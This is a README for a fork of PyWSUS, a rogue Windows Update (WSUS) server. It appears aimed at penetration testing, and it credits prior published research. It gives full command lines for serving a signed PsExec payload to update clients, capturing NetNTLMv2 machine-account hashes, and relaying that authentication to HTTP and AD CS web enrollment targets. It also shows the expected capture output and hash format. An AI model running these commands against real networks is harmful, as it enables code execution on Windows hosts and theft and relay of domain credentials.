# PyWSUS

Rogue WSUS-over-HTTP server that keeps Windows Update Agent (WUA) talking while serving controlled WSUS metadata and a Microsoft-signed payload.

This fork adds NTLM capture, basic HTTP relay, and AD CS `/certsrv/` validation.

## Install

```bash
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

Use a Microsoft-signed PE payload, for example `PsExec64.exe`.

## Run

Normal WSUS mode:

```bash
python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' -v
```

NTLM capture:

```bash
python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
  --ntlm-mode capture \
  --hash-file netntlm-captures.txt \
  --json-events wsus-events.jsonl \
  -v
```

HTTP relay:

```bash
python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
  --ntlm-mode relay-http \
  --relay-target http://target.lab.local/protected/ \
  --relay-action auth-only \
  -v
```

AD CS Web Enrollment validation:

```bash
python3 pywsus.py -H 0.0.0.0 -p 8530 -e PsExec64.exe -c '/accepteula' \
  --ntlm-mode relay-http \
  --relay-target http://ca.lab.local/certsrv/ \
  --relay-action adcs-certsrv \
  --relay-adcs-marker PYWSUS-LAB-ADCS \
  --json-events relay-adcs.jsonl \
  -v
```

## Useful Options

```text
--ntlm-mode {off,challenge-only,capture,relay-http}
--relay-target URL
--relay-action {auth-only,adcs-certsrv}
--relay-adcs-marker TEXT
--ntlm-session-key {ip,connection}
--ntlm-protect-downloads
--hash-file FILE
--json-events FILE
--log-file FILE
-r HOURS
```

Interactive keys:

```text
q  quit
r  rotate session
```

## Expected Signals

Capture:

```text
NTLM Type 3 authenticate received ... identity=DOMAIN\HOST$
HashCapture NetNTLMv2 DOMAIN\HOST$ -> netntlm-captures.txt
GetConfig
```

AD CS relay validation:

```text
HTTP relay result ... authenticated=True service=adcs-web-enrollment service_validated=True
```

## Notes

- Default NTLM session key is `ip`; use this for single-client WUA testing.
- Use `--ntlm-session-key connection` for stricter IP+source-port tracking.
- NetNTLMv2 output format: `user::domain:challenge:nt_proof:client_blob`.
- Generated state includes `data/known_clients.json`, `netntlm-captures.txt`, and optional JSONL event logs.
- AD CS validation confirms an authenticated `/certsrv/` page; it does not submit CSRs or retrieve certificates.

## Credits

Original PyWSUS research/tooling by GoSecure, with prior proxy PoC research by Paul Stone and Alex Chapman. See the GoSecure WSUS attack blog series and MS-WUSP documentation for protocol background.
